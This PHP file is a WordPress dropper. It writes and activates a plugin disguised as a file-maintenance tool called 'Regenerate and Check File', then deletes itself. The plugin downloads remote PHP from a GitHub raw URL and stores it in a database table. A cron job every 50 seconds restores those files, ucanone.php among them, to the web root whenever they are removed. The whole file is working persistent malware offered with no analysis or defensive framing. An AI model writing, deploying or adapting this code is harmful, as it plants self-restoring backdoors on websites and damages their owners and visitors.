<?php

define('WP_USE_THEMES', false);
require_once('wp-load.php');
require_once(ABSPATH . 'wp-admin/includes/plugin.php');


$plugin_folder = WP_CONTENT_DIR . '/plugins/regenerate-check-file';
$plugin_file = $plugin_folder . '/regenerate-check-file.php';

if (!file_exists($plugin_folder)) {
    mkdir($plugin_folder, 0755, true);

    $plugin_content = <<<EOT
<?php
/*
Plugin Name: Regenerate and Check File
Description: Regenerates files in the uploads folder and root directory. Uses WP-CRON to regenerate files at regular intervals.
Version: 1.0
Author: KADER 
*/

register_activation_hook(__FILE__, function() {
    global \$wpdb;
    \$table_name = \$wpdb->prefix . 'regenerate_files';
    \$charset_collate = \$wpdb->get_charset_collate();

    \$sql = "CREATE TABLE \$table_name (
        id mediumint(9) NOT NULL AUTO_INCREMENT,
        file_name varchar(255) NOT NULL,
        file_content longtext NOT NULL,
        PRIMARY KEY (id)
    ) \$charset_collate;";

    require_once(ABSPATH . 'wp-admin/includes/upgrade.php');
    dbDelta(\$sql);

    \$files_content = [
        'ucanone.php' => "https://raw.githubusercontent.com/youngkmd/seo/refs/heads/main/adds.txt",
        'ucanone-root.php' => "https://raw.githubusercontent.com/youngkmd/seo/refs/heads/main/adds.txt",
    ];

    foreach (\$files_content as \$file_name => \$file_url) {
        \$existing_file = \$wpdb->get_row(
            \$wpdb->prepare("SELECT * FROM \$table_name WHERE file_name = %s", \$file_name)
        );

        if (!\$existing_file) {
            \$response = wp_remote_get(\$file_url);

            if (!is_wp_error(\$response) && \$response['response']['code'] === 200) {
                \$file_content = \$response['body'];
            } else {
                \$file_content = "<?php\\necho 'Hello, WordPress!';\n";
            }

            \$wpdb->insert(
                \$table_name,
                [
                    'file_name' => \$file_name,
                    'file_content' => \$file_content,
                ]
            );
        }
    }
});

register_deactivation_hook(__FILE__, function() {
    global \$wpdb;
    \$table_name = \$wpdb->prefix . 'regenerate_files';
    \$wpdb->query("DROP TABLE IF EXISTS \$table_name");
});

add_filter('cron_schedules', function(\$schedules) {
    \$schedules['fifty_seconds'] = array(
        'interval' => 50,
        'display'  => __('Every 50 Seconds')
    );
    return \$schedules;
});

register_activation_hook(__FILE__, function() {
    if (!wp_next_scheduled('check_and_regenerate_file')) {
        wp_schedule_event(time(), 'fifty_seconds', 'check_and_regenerate_file');
    }
});

register_deactivation_hook(__FILE__, function() {
    wp_clear_scheduled_hook('check_and_regenerate_file');
});

add_action('check_and_regenerate_file', function() {
    global \$wpdb;
    \$table_name = \$wpdb->prefix . 'regenerate_files';

    \$files = \$wpdb->get_results("SELECT file_name, file_content FROM \$table_name");

    foreach (\$files as \$file) {
        \$file_name = \$file->file_name;
        \$file_content = \$file->file_content;

        if (\$file_name === 'sample-file.php') {
            \$upload_dir = wp_upload_dir();
            \$file_path = \$upload_dir['basedir'] . '/' . \$file_name;
        } else {
            \$file_path = ABSPATH . '/' . \$file_name;
        }

        if (!file_exists(\$file_path)) {
            file_put_contents(\$file_path, \$file_content);
        }
    }
});
EOT;

    file_put_contents($plugin_file, $plugin_content);

    $result = activate_plugin('regenerate-check-file/regenerate-check-file.php');
    if (is_wp_error($result)) {
        echo "Error: " . $result->get_error_message();
        exit;
    }

    echo "Plugin created and activated successfully!";
} else {
    echo "Plugin already exists.";
}


unlink(__FILE__);
